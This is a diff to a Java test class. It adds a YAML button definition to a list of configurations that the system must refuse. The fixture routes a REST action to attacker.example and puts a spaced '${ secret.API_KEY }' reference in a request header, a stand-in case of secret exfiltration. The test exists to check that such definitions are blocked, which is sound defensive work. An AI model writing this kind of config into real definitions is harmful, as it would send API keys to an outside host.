@@ -261,6 +261,11 @@ class McpAuthoringSyncTest {
         "p3.yaml",
         "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n"
       },
+      // the interpolator trims the expression, so a spaced reference resolves a secret too (N15)
+      {
+        "p4.yaml",
+        "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: \"${ secret.API_KEY }\"\n"
+      },
     };
     for (var definition : refusedDefinitions) {
       var answer =
